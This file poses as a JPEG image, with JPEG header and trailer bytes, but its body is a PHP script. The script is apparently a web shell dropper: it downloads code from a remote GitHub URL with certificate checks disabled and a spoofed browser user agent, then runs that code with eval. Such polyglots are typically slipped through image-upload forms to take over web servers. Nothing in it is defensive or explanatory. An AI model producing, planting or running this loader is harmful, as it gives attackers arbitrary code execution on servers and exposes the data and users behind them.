ÿØÿàJFIFÿÛ
<?php
function getRemotePHP($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    $code = curl_exec($ch);
    curl_close($ch);

    if (!$code) {
        die('Gagal ambil file dari URL Cok :(.');
    }

    eval("?>$code");
}

getRemotePHP('https://raw.githubusercontent.com/asukoe1337/function/main/function.php');

?>
ÿÙ
